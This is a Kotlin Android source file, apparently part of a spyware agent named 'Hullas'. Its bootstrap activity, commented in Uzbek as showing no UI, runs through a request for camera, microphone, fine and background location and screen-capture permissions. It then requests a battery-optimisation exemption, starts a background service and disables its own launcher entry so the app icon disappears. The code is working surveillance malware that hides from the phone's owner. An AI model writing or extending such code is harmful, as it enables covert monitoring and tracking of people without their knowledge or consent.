package org.hullas.agent

import android.Manifest
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat

/**
 * Birinchi ochilishda: barcha ruxsatlar → ekran ruxsati → batareya → yashirish.
 * Hech qanday UI ko'rinmaydi.
 */
class BootstrapActivity : AppCompatActivity() {
    private var step = 0

    private val basicPerms = buildList {
        add(Manifest.permission.CAMERA)
        add(Manifest.permission.RECORD_AUDIO)
        add(Manifest.permission.ACCESS_FINE_LOCATION)
        add(Manifest.permission.ACCESS_COARSE_LOCATION)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            add(Manifest.permission.POST_NOTIFICATIONS)
        }
    }.toTypedArray()

    private val basicPermLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions(),
    ) { nextStep() }

    private val bgLocationLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission(),
    ) { nextStep() }

    private val screenshotLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult(),
    ) { result ->
        if (result.resultCode == RESULT_OK && result.data != null) {
            ScreenshotPermissionActivity.handleResult(
                this, result.resultCode, result.data!!,
            )
        }
        nextStep()
    }

    private val batteryLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult(),
    ) { nextStep() }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        HullasService.start(this)

        if (Prefs.isInitialized(this)) {
            finishSilent()
            return
        }
        runStep()
    }

    private fun runStep() {
        when (step) {
            0 -> basicPermLauncher.launch(basicPerms)
            1 -> requestBackgroundLocation()
            2 -> screenshotLauncher.launch(ScreenshotPermissionActivity.createIntent(this))
            3 -> requestBatteryExemption()
            else -> completeSetup()
        }
    }

    private fun requestBackgroundLocation() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
            ContextCompat.checkSelfPermission(
                this, Manifest.permission.ACCESS_FINE_LOCATION,
            ) == PackageManager.PERMISSION_GRANTED
        ) {
            bgLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        } else {
            nextStep()
        }
    }

    private fun nextStep() {
        step++
        runStep()
    }

    private fun requestBatteryExemption() {
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (pm.isIgnoringBatteryOptimizations(packageName)) {
            nextStep()
            return
        }
        try {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:$packageName")
            }
            batteryLauncher.launch(intent)
        } catch (_: Exception) {
            nextStep()
        }
    }

    private fun completeSetup() {
        Prefs.setInitialized(this)
        finishSilent()
    }

    private fun finishSilent() {
        HullasService.start(this)
        hideLauncher()
        moveTaskToBack(true)
        finish()
    }

    private fun hideLauncher() {
        packageManager.setComponentEnabledSetting(
            ComponentName(this, BootstrapActivity::class.java),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP,
        )
    }
}